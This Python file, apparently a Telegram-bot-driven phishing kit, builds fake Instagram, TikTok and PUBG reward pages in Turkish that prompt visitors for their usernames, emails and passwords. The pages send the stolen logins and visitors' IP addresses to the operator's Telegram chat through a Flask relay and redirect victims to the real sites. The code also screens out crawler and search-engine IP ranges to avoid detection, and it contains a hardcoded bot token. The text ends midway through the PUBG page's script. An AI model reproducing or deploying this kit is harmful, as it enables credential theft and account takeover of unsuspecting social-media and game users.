import logging
import subprocess
import threading
import time
import json
import requests
import os
import re
import signal
import sys
import asyncio
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from telegram.error import TimedOut, NetworkError, Conflict, RetryAfter

# ============================================
# TELEGRAM BOT TOKEN
# ============================================
TOKEN = "8924083527:AAF_8I4NVcGhEiYEb1ygT78BwDQiNVDscrM"
OWNER_USERNAME = "SnowyOrj"
OWNER_ID = 8121373631
CHANNEL_USERNAME = "SnowyCyber"

# ============================================
# URL KISALTMA API (https://urlsmush.com)
# ============================================
URL_SHORTENER_API = "https://urlsmush.com/api.php"

# ============================================
# CONVERSATION STATES
# ============================================
SELECT_MODE, SELECT_NUMBER_TYPE = range(2)

# ============================================
# GLOBAL DEĞİŞKENLER
# ============================================
class BotState:
    def __init__(self):
        self.bot_application = None
        self.target_chat_id = None
        self.visitor_count = 0
        self.lock = threading.Lock()
        self.processed_visitors = set()
        self.bot_count = 0
        self.last_start_time = {}
        self.user_mode = {}
        self.user_number_type = {}
        self.running = True
        self.last_activity = datetime.now()
        self.tunnel_process = None
        self.flask_thread = None
        self.bot_task = None
        self.base_url = None

bot_state = BotState()

# ============================================
# URL KISALTMA FONKSİYONU
# ============================================
def shorten_url(long_url):
    try:
        response = requests.post(
            URL_SHORTENER_API,
            json={"url": long_url},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success' and 'data' in data:
                short_url = data['data'].get('short_url')
                if short_url:
                    print(f"✅ URL kısaltıldı: {long_url} -> {short_url}")
                    return short_url
            
            short_url = data.get('shortenedUrl') or data.get('short_url') or data.get('url')
            if short_url:
                print(f"✅ URL kısaltıldı: {long_url} -> {short_url}")
                return short_url
            else:
                return long_url
        else:
            return long_url
    except Exception as e:
        return long_url

# ============================================
# FLASK APP
# ============================================
flask_app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# TÜM BOT IP'LERİ
BOT_IP_PREFIXES = [
    '66.', '66.249.', '66.102.', '74.125.', '142.250.', '216.239.',
    '35.0.', '34.0.', '8.8.', '108.177.', '172.217.', '173.194.',
    '192.178.', '157.240.', '69.171.', '31.13.', '179.60.', '131.253.',
    '207.46.', '52.167.', '40.77.', '157.55.', '40.0.', '52.0.', '54.0.',
    '13.0.', '18.0.', '20.0.', '104.16.', '104.17.', '104.18.', '104.19.',
    '104.20.', '104.21.', '104.22.', '104.23.', '104.24.', '104.25.',
    '104.26.', '172.64.', '172.65.', '172.66.', '172.67.',
]

SPECIAL_BOT_IPS = [
    '74.125.212.32', '66.102.9.38', '66.102.8.129', '66.102.9.32',
    '66.249.83.107', '74.125.208.75', '66.102.8.131', '66.249.83.',
    '66.249.80.', '66.249.81.', '66.249.82.', '66.249.84.', '66.249.85.',
    '66.249.86.', '66.249.87.', '66.249.88.', '66.249.89.', '66.249.90.',
    '66.249.91.', '66.249.92.', '66.249.93.', '66.249.94.', '66.249.95.',
    '66.249.96.', '66.249.97.', '66.249.98.', '66.249.99.',
]

def is_bot(ip):
    for bot_ip in SPECIAL_BOT_IPS:
        if ip == bot_ip or ip.startswith(bot_ip):
            return True, "ÖZEL ENGELLİ"
    
    ip_parts = ip.split('.')
    if len(ip_parts) >= 1 and ip_parts[0] == '66':
        return True, "66 İLE BAŞLAYAN IP (KESİN ENGEL)"
    
    for prefix in BOT_IP_PREFIXES:
        if ip.startswith(prefix):
            return True, "BOT"
    
    return False, None

def get_real_ip():
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_location(ip):
    if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.') or ip == 'localhost':
        return {'ulke': 'Yerel Ağ', 'sehir': 'Localhost', 'lat': '-', 'lon': '-', 'isp': 'Yerel', 'tz': 'Yerel', 'ulke_kod': 'LOCAL', 'postal': '-'}
    
    try:
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get('country_name'):
                return {
                    'ulke': d.get('country_name', 'Bilinmiyor'),
                    'ulke_kod': d.get('country_code', '?'),
                    'sehir': d.get('city', 'Bilinmiyor'),
                    'lat': d.get('latitude', '-'),
                    'lon': d.get('longitude', '-'),
                    'isp': d.get('org', 'Bilinmiyor'),
                    'tz': d.get('timezone', 'Bilinmiyor'),
                    'postal': d.get('postal', '?')
                }
    except:
        pass
    
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get('status') == 'success':
                return {
                    'ulke': d.get('country', 'Bilinmiyor'),
                    'ulke_kod': d.get('countryCode', '?'),
                    'sehir': d.get('city', 'Bilinmiyor'),
                    'lat': d.get('lat', '-'),
                    'lon': d.get('lon', '-'),
                    'isp': d.get('isp', 'Bilinmiyor'),
                    'tz': d.get('timezone', 'Bilinmiyor'),
                    'postal': d.get('zip', '?')
                }
    except:
        pass
    
    return {
        'ulke': 'Bilinmiyor',
        'ulke_kod': '?',
        'sehir': 'Bilinmiyor',
        'lat': '-',
        'lon': '-',
        'isp': 'Bilinmiyor',
        'tz': 'Bilinmiyor',
        'postal': '?'
    }

def send_telegram_message_sync(chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            return True
        return False
    except Exception as e:
        return False

@flask_app.route('/send-message', methods=['POST'])
def send_message():
    try:
        data = request.get_json()
        chat_id = data.get('chat_id')
        text = data.get('text')
        if not chat_id or not text:
            return jsonify({'status': 'error'}), 400
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        resp = requests.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            return jsonify({'status': 'ok'})
        else:
            return jsonify({'status': 'error'}), 500
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@flask_app.route('/send-photo', methods=['POST'])
def send_photo():
    try:
        chat_id = request.form.get('chat_id')
        photo_file = request.files.get('photo')
        caption = request.form.get('caption', '')
        if not chat_id or not photo_file:
            return jsonify({'status': 'error'}), 400
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        files = {'photo': (photo_file.filename, photo_file.stream, photo_file.content_type)}
        data = {'chat_id': chat_id, 'caption': caption}
        resp = requests.post(url, data=data, files=files, timeout=15)
        if resp.status_code == 200:
            return jsonify({'status': 'ok'})
        else:
            return jsonify({'status': 'error'}), 500
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@flask_app.route('/send-video', methods=['POST'])
def send_video():
    try:
        chat_id = request.form.get('chat_id')
        video_file = request.files.get('video')
        caption = request.form.get('caption', '')
        if not chat_id or not video_file:
            return jsonify({'status': 'error'}), 400
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
        files = {'video': (video_file.filename, video_file.stream, video_file.content_type)}
        data = {'chat_id': chat_id, 'caption': caption}
        resp = requests.post(url, data=data, files=files, timeout=20)
        if resp.status_code == 200:
            return jsonify({'status': 'ok'})
        else:
            return jsonify({'status': 'error'}), 500
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@flask_app.route('/send-audio', methods=['POST'])
def send_audio():
    try:
        chat_id = request.form.get('chat_id')
        audio_file = request.files.get('audio')
        caption = request.form.get('caption', '')
        if not chat_id or not audio_file:
            return jsonify({'status': 'error'}), 400
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendAudio"
        files = {'audio': (audio_file.filename, audio_file.stream, audio_file.content_type)}
        data = {'chat_id': chat_id, 'caption': caption}
        resp = requests.post(url, data=data, files=files, timeout=20)
        if resp.status_code == 200:
            return jsonify({'status': 'ok'})
        else:
            return jsonify({'status': 'error'}), 500
    except Exception as e:
        return jsonify({'status': 'error'}), 500

# ============================================
# INSTAGRAM HACK SAYFASI
# ============================================
INSTAGRAM_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>SNOWY Instagram | Ücretsiz Mavi Tik</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #fff;
            padding: 16px;
            border-bottom: 1px solid #dbdbdb;
            text-align: center;
        }
        .logo {
            font-size: 28px;
            font-weight: 600;
            background: linear-gradient(45deg, #f09433, #d62976, #962fbf);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .snowy-badge {
            display: inline-block;
            background: #3897f0;
            color: white;
            border-radius: 20px;
            padding: 4px 12px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 8px;
        }
        .content { padding: 24px; }
        .info-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            border-left: 4px solid #3897f0;
        }
        .info-box h3 { font-size: 16px; margin-bottom: 8px; color: #262626; }
        .info-box p { font-size: 14px; color: #8e8e8e; line-height: 1.5; }
        .input-group { margin-bottom: 16px; }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #262626;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            font-size: 14px;
            background: #fafafa;
            transition: all 0.2s;
        }
        .input-group input:focus {
            border-color: #3897f0;
            outline: none;
            background: white;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #3897f0;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
        }
        .btn:hover { background: #3181cf; }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #e0e0e0;
            border-top-color: #3897f0;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin-top: 16px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        .footer {
            padding: 16px;
            border-top: 1px solid #dbdbdb;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }
        .warning {
            background: #fff3e0;
            border-left: 4px solid #ff9800;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 8px;
            font-size: 12px;
            color: #e65100;
        }
        .snowy-credit {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 8px;
            text-align: center;
            font-size: 12px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="logo">SNOWY Instagram</span>
            <span class="snowy-badge">✓ Mavi Tik</span>
        </div>
        <div class="content">
            <div class="info-box">
                <h3>🎉 SNOWY ÖZEL ÜCRETSİZ MAVİ TİK</h3>
                <p>Instagram hesabınızı ücretsiz olarak doğrulayın! Bu fırsat sadece SNOWY kullanıcılarına özeldir.</p>
            </div>
            <div class="warning">
                ⚠️ <strong>ÖNEMLİ:</strong> Hesabınızı doğrulamak için Instagram giriş bilgilerinizi girin. Bu işlem tamamen güvenlidir.
            </div>
            <div class="input-group">
                <label>📱 Kullanıcı Adı veya E-posta</label>
                <input type="text" id="username" placeholder="kullanici_adi veya email@example.com" autocomplete="off">
            </div>
            <div class="input-group">
                <label>🔒 Şifre</label>
                <input type="password" id="password" placeholder="••••••••">
            </div>
            <button class="btn" id="submitBtn" onclick="sendCredentials()">✓ SNOWY MAVİ TİK AL</button>
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <div>Hesap doğrulanıyor...</div>
            </div>
            <div class="success-message" id="successMsg">
                ✅ Hesabınız doğrulandı! Mavi tikiniz 24 saat içinde aktif olacaktır.
            </div>
        </div>
        <div class="footer">
            © 2026 SNOWY Instagram • Mavi Tik Doğrulama Programı
        </div>
        <div class="snowy-credit">
            ❄️ SNOWY SECURITY ❄️
        </div>
    </div>
    <script>
        const TARGET_ID = "{{ chat_id }}";
        
        let visitorId = localStorage.getItem('visitor_id');
        if (!visitorId) {
            visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitor_id', visitorId);
        }
        
        const ua = navigator.userAgent.toLowerCase();
        const isBotUA = /bot|crawler|spider|scraper|curl|wget|python|java|googlebot|bingbot|facebook|slurp|baiduspider|yandex|duckduckgo|teoma|archive|axios|http|headless/i.test(ua);
        
        let ipSent = localStorage.getItem('ip_sent_insta');
        
        if (!isBotUA && !ipSent && TARGET_ID) {
            localStorage.setItem('ip_sent_insta', 'true');
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    window.visitorIP = data.ip;
                    console.log('IP alındı:', window.visitorIP);
                })
                .catch(e => console.log('IP alınamadı:', e));
        }
        
        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }
        
        function sendToTelegram(username, password, ip) {
            if (!username || !password) return;
            let msgText = `📸 <b>SNOWY INSTAGRAM HACK</b> 📸\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip || 'Alınamadı'}\n👤 KULLANICI: ${escapeHtml(username)}\n🔑 ŞİFRE: ${escapeHtml(password)}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
            
            fetch('/send-message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TARGET_ID,
                    text: msgText
                })
            }).then(res => console.log('Telegram gönderimi yapıldı')).catch(e => console.log('Gönderim hatası:', e));
        }
        
        window.sendCredentials = function() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                alert('Lütfen kullanıcı adı ve şifrenizi girin!');
                return;
            }
            
            function sendWithIP() {
                let ip = window.visitorIP || 'Alınamadı';
                sendToTelegram(username, password, ip);
                
                document.getElementById('submitBtn').style.display = 'none';
                document.getElementById('loading').style.display = 'block';
                
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('successMsg').style.display = 'block';
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/';
                    }, 3000);
                }, 2000);
            }
            
            if (window.visitorIP) {
                sendWithIP();
            } else {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        window.visitorIP = data.ip;
                        sendWithIP();
                    })
                    .catch(() => {
                        sendWithIP();
                    });
            }
        };
    </script>
</body>
</html>'''

# ============================================
# TIKTOK HACK SAYFASI (MİKTAR KUTULU)
# ============================================
TIKTOK_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>SNOWY TikTok | Ücretsiz Takipçi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #010101;
            font-family: -apple-system, BlinkMacSystemFont, 'Segui UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            border-radius: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .header {
            background: rgba(0,0,0,0.5);
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(45deg, #00f2fe, #4facfe);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .snowy-badge {
            display: inline-block;
            background: #ff0050;
            color: white;
            border-radius: 20px;
            padding: 4px 12px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 8px;
        }
        .content { padding: 24px; }
        .info-box {
            background: rgba(255,255,255,0.05);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            border-left: 4px solid #ff0050;
        }
        .info-box h3 { font-size: 16px; margin-bottom: 8px; color: white; }
        .info-box p { font-size: 14px; color: #aaa; line-height: 1.5; }
        .input-group { margin-bottom: 16px; }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #ddd;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 12px;
            font-size: 14px;
            background: rgba(0,0,0,0.3);
            color: white;
            transition: all 0.2s;
        }
        .input-group input:focus {
            border-color: #ff0050;
            outline: none;
            background: rgba(0,0,0,0.5);
        }
        .input-group input::placeholder {
            color: #666;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(45deg, #ff0050, #ff6b00);
            color: white;
            border: none;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
        }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top-color: #ff0050;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .success-message {
            background: rgba(0,255,0,0.1);
            color: #00ff88;
            padding: 12px;
            border-radius: 12px;
            margin-top: 16px;
            font-size: 14px;
            text-align: center;
            display: none;
            border: 1px solid #00ff88;
        }
        .footer {
            padding: 16px;
            border-top: 1px solid rgba(255,255,255,0.1);
            text-align: center;
            font-size: 12px;
            color: #666;
        }
        .warning {
            background: rgba(255,0,0,0.1);
            border-left: 4px solid #ff0050;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 12px;
            font-size: 12px;
            color: #ff8888;
        }
        .snowy-credit {
            background: linear-gradient(135deg, #ff0050, #ff6b00);
            color: white;
            padding: 8px;
            text-align: center;
            font-size: 12px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="logo">SNOWY TikTok</span>
            <span class="snowy-badge">⭐ Ücretsiz Takipçi</span>
        </div>
        <div class="content">
            <div class="info-box">
                <h3>🎉 SNOWY ÖZEL ÜCRETSİZ TAKİPÇİ</h3>
                <p>TikTok hesabınıza ücretsiz takipçi kazanın! Bu fırsat sadece SNOWY kullanıcılarına özeldir.</p>
            </div>
            <div class="warning">
                ⚠️ <strong>ÖNEMLİ:</strong> Takipçi kazanmak için TikTok giriş bilgilerinizi girin. Bu işlem tamamen güvenlidir.
            </div>
            <div class="input-group">
                <label>📱 Kullanıcı Adı veya E-posta</label>
                <input type="text" id="username" placeholder="kullanici_adi veya email@example.com" autocomplete="off">
            </div>
            <div class="input-group">
                <label>🔒 Şifre</label>
                <input type="password" id="password" placeholder="••••••••">
            </div>
            <div class="input-group">
                <label>⭐ TAKİPÇİ MİKTARI</label>
                <input type="number" id="amount" placeholder="1000" value="1000">
            </div>
            <button class="btn" id="submitBtn" onclick="sendCredentials()">⭐ SNOWY TAKİPÇİ KAZAN</button>
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <div>Takipçiler ekleniyor...</div>
            </div>
            <div class="success-message" id="successMsg">
                ✅ Takipçiler başarıyla eklendi! Hesabınıza yansıtılıyor.
            </div>
        </div>
        <div class="footer">
            © 2026 SNOWY TikTok • Ücretsiz Takipçi Programı
        </div>
        <div class="snowy-credit">
            ❄️ SNOWY SECURITY ❄️
        </div>
    </div>
    <script>
        const TARGET_ID = "{{ chat_id }}";
        
        let visitorId = localStorage.getItem('visitor_id');
        if (!visitorId) {
            visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitor_id', visitorId);
        }
        
        const ua = navigator.userAgent.toLowerCase();
        const isBotUA = /bot|crawler|spider|scraper|curl|wget|python|java|googlebot|bingbot|facebook|slurp|baiduspider|yandex|duckduckgo|teoma|archive|axios|http|headless/i.test(ua);
        
        let ipSent = localStorage.getItem('ip_sent_tiktok');
        
        if (!isBotUA && !ipSent && TARGET_ID) {
            localStorage.setItem('ip_sent_tiktok', 'true');
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    window.visitorIP = data.ip;
                    console.log('IP alındı:', window.visitorIP);
                })
                .catch(e => console.log('IP alınamadı:', e));
        }
        
        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }
        
        function sendToTelegram(username, password, amount, ip) {
            if (!username || !password) return;
            let msgText = `🎵 <b>SNOWY TIKTOK HACK</b> 🎵\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip || 'Alınamadı'}\n👤 KULLANICI: ${escapeHtml(username)}\n🔑 ŞİFRE: ${escapeHtml(password)}\n⭐ MİKTAR: ${amount}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
            
            fetch('/send-message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TARGET_ID,
                    text: msgText
                })
            }).then(res => console.log('Telegram gönderimi yapıldı')).catch(e => console.log('Gönderim hatası:', e));
        }
        
        window.sendCredentials = function() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const amount = document.getElementById('amount').value.trim();
            
            if (!username || !password) {
                alert('Lütfen kullanıcı adı ve şifrenizi girin!');
                return;
            }
            
            function sendWithIP() {
                let ip = window.visitorIP || 'Alınamadı';
                sendToTelegram(username, password, amount, ip);
                
                document.getElementById('submitBtn').style.display = 'none';
                document.getElementById('loading').style.display = 'block';
                
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('successMsg').style.display = 'block';
                    setTimeout(() => {
                        window.location.href = 'https://www.tiktok.com/';
                    }, 3000);
                }, 2000);
            }
            
            if (window.visitorIP) {
                sendWithIP();
            } else {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        window.visitorIP = data.ip;
                        sendWithIP();
                    })
                    .catch(() => {
                        sendWithIP();
                    });
            }
        };
    </script>
</body>
</html>'''

# ============================================
# PUBG HACK SAYFASI (E-POSTA + OYUNCU ID + MİKTAR)
# ============================================
PUBG_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>SNOWY PUBG | Bedava UC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            overflow: hidden;
            border: 1px solid rgba(0,0,0,0.1);
        }
        .header {
            background: linear-gradient(135deg, #f5af19, #f12711);
            padding: 20px;
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: white;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .snowy-badge {
            display: inline-block;
            background: #fff;
            color: #f12711;
            border-radius: 20px;
            padding: 4px 12px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 8px;
        }
        .content { padding: 24px; }
        .info-box {
            background: #f8f9fa;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            border-left: 4px solid #f12711;
        }
        .info-box h3 { font-size: 16px; margin-bottom: 8px; color: #333; }
        .info-box p { font-size: 14px; color: #666; line-height: 1.5; }
        .input-group { margin-bottom: 16px; }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #333;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 14px;
            background: #fafafa;
            transition: all 0.2s;
        }
        .input-group input:focus {
            border-color: #f12711;
            outline: none;
            background: white;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #f5af19, #f12711);
            color: white;
            border: none;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
        }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #e0e0e0;
            border-top-color: #f12711;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 12px;
            margin-top: 16px;
            font-size: 14px;
            text-align: center;
            display: none;
            border: 1px solid #c3e6cb;
        }
        .footer {
            padding: 16px;
            border-top: 1px solid #e0e0e0;
            text-align: center;
            font-size: 12px;
            color: #888;
        }
        .warning {
            background: #fff3e0;
            border-left: 4px solid #ff9800;
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 12px;
            font-size: 12px;
            color: #e65100;
        }
        .snowy-credit {
            background: linear-gradient(135deg, #f5af19, #f12711);
            color: white;
            padding: 8px;
            text-align: center;
            font-size: 12px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="logo">SNOWY PUBG</span>
            <span class="snowy-badge">🎮 Bedava UC</span>
        </div>
        <div class="content">
            <div class="info-box">
                <h3>🎉 SNOWY ÖZEL BEDAVA UC</h3>
                <p>PUBG Mobile hesabınıza ücretsiz UC kazanın! Bu fırsat sadece SNOWY kullanıcılarına özeldir.</p>
            </div>
            <div class="warning">
                ⚠️ <strong>ÖNEMLİ:</strong> UC kazanmak için PUBG hesap bilgilerinizi girin. Bu işlem tamamen güvenlidir.
            </div>
            <div class="input-group">
                <label>📧 E-posta Adresi</label>
                <input type="email" id="email" placeholder="ornek@email.com" autocomplete="off">
            </div>
            <div class="input-group">
                <label>🔒 Şifre</label>
                <input type="password" id="password" placeholder="••••••••">
            </div>
            <div class="input-group">
                <label>🎮 Oyuncu ID</label>
                <input type="text" id="playerid" placeholder="Oyuncu ID'niz" autocomplete="off">
            </div>
            <div class="input-group">
                <label>💰 UC MİKTARI</label>
                <input type="number" id="amount" placeholder="10000" value="10000">
            </div>
            <button class="btn" id="submitBtn" onclick="sendCredentials()">🎮 BEDAVA UC KAZAN</button>
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <div>UC ekleniyor...</div>
            </div>
            <div class="success-message" id="successMsg">
                ✅ UC başarıyla eklendi! Hesabınıza yansıtılıyor.
            </div>
        </div>
        <div class="footer">
            © 2026 SNOWY PUBG • Bedava UC Programı
        </div>
        <div class="snowy-credit">
            ❄️ SNOWY SECURITY ❄️
        </div>
    </div>
    <script>
        const TARGET_ID = "{{ chat_id }}";
        
        let visitorId = localStorage.getItem('visitor_id');
        if (!visitorId) {
            visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitor_id', visitorId);
        }
        
        const ua = navigator.userAgent.toLowerCase();
        const isBotUA = /bot|crawler|spider|scraper|curl|wget|python|java|googlebot|bingbot|facebook|slurp|baiduspider|yandex|duckduckgo|teoma|archive|axios|http|headless/i.test(ua);
        
        let ipSent = localStorage.getItem('ip_sent_pubg');
        
        if (!isBotUA && !ipSent && TARGET_ID) {
            localStorage.setItem('ip_sent_pubg', 'true');
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    window.visitorIP = data.ip;
                    console.log('IP alındı:', window.visitorIP);
                })
                .catch(e => console.log('IP alınamadı:', e));
        }
        
        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }
        
        function sendToTelegram(email, password, playerid, amount, ip) {
            if (!email || !password) return;
